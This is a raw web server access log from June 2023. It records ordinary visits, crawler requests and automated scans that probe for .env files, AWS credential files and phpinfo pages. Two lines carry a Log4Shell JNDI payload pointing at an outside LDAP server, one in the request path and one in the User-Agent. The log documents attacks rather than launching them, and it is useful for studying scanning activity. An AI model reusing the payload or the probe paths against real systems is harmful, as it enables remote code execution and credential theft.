::ffff:109.237.98.226 - - [19/Jun/2023:00:11:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:172.105.128.13 - - [19/Jun/2023:07:30:13 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:154.209.125.2 - - [19/Jun/2023:07:31:30 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
::ffff:185.191.171.37 - - [19/Jun/2023:07:33:36 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.18 - - [19/Jun/2023:07:33:37 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:43.155.118.219 - - [19/Jun/2023:07:37:47 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:185.191.171.20 - - [19/Jun/2023:07:46:45 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:51.159.164.227 - - [19/Jun/2023:07:51:20 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:51.159.164.227 - - [19/Jun/2023:07:51:20 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:77.245.221.70 - - [19/Jun/2023:08:02:07 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:162.216.149.223 - - [19/Jun/2023:08:12:36 +0000] "GET / HTTP/1.1" 200 57394 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:51.89.5.185 - - [19/Jun/2023:08:21:23 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [19/Jun/2023:08:21:23 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:34.65.168.185 - - [19/Jun/2023:08:38:57 +0000] "OPTIONS / HTTP/1.0" 200 8 "-" "-"
::ffff:54.165.112.211 - - [19/Jun/2023:08:49:42 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/50.0.3006.72 Safari/537.32"
::ffff:43.155.118.219 - - [19/Jun/2023:08:54:57 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:185.254.196.173 - - [19/Jun/2023:08:56:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [19/Jun/2023:08:56:54 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:07 +0000] "HEAD / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:08 +0000] "GET /.aws/credentials HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:08 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:09 +0000] "GET /.env.bak HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:09 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:10 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:10 +0000] "GET /_wpeprivate/config.json HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:10 +0000] "GET /admin/.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:11 +0000] "GET /api/.env HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:11 +0000] "GET /aws.yml HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:11 +0000] "GET /config.js HTTP/1.1" 404 148 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:12 +0000] "GET /config/aws.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:12 +0000] "GET /info.json HTTP/1.1" 404 148 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:12 +0000] "GET /info.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:13 +0000] "GET /laravel/.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:13 +0000] "GET /php-info HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:13 +0000] "GET /phpinfo HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:14 +0000] "GET /phpinfo.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:54.242.147.19 - - [19/Jun/2023:08:59:14 +0000] "GET /test.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
::ffff:221.130.143.254 - - [19/Jun/2023:09:11:48 +0000] "GET /${jndi:ldap://108.181.33.59:1389/Exploit} HTTP/1.1" - - "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
::ffff:221.130.143.254 - - [19/Jun/2023:09:11:48 +0000] "GET / HTTP/1.1" - - "-" "${jndi:ldap://108.181.33.59:1389/Exploit}"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /vendor/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /.env.txt HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /env.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /.env.bak HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /.aws/credentials/phpinfo HTTP/1.1" 404 163 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /phpinfo.php HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /aws.yml HTTP/1.1" 404 146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /info.php HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /config/aws.yml HTTP/1.1" 404 153 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /.env.example HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /.env_old HTTP/1.1" 404 147 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /vendor/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /core/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /config/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /app/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /web/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /public/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:04 +0000] "GET /en/.env.example HTTP/1.1" 404 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /laravel/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /api/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /app/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /app/frontend/.env.example HTTP/1.1" 404 164 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /application/.env.example HTTP/1.1" 404 163 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /awstats/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /back-end/app/.env.example HTTP/1.1" 404 164 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /backend/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /backup/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /bootstrap/.env.example HTTP/1.1" 404 161 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /build/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /core/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /data/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /database/.env.example HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /demo/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /dev/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:05 +0000] "GET /developer/.env.example HTTP/1.1" 404 161 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /django_project_path/.env.example HTTP/1.1" 404 171 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /docker/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /docs/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /en/.env.example HTTP/1.1" 404 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /env/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /environments/.env.example HTTP/1.1" 404 164 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /example/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /examples/.env.example HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /front-app/.env.example HTTP/1.1" 404 161 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /front-empathy/.env.example HTTP/1.1" 404 165 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /front-end/.env.example HTTP/1.1" 404 161 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /front/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /frontend/.env.example HTTP/1.1" 404 160 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /js/.env.example HTTP/1.1" 404 154 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /local/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /log/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /mail/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /prod/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /production/.env.example HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /pub/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /public/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /rest/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /route/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /src/.env.example HTTP/1.1" 404 155 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /stag/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /staging/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /static/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /stats/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /storage/.env.example HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /system/.env.example HTTP/1.1" 404 158 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /temp/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /test/.env.example HTTP/1.1" 404 156 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:35.90.231.0 - - [19/Jun/2023:09:24:08 +0000] "GET /tests/.env.example HTTP/1.1" 404 157 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
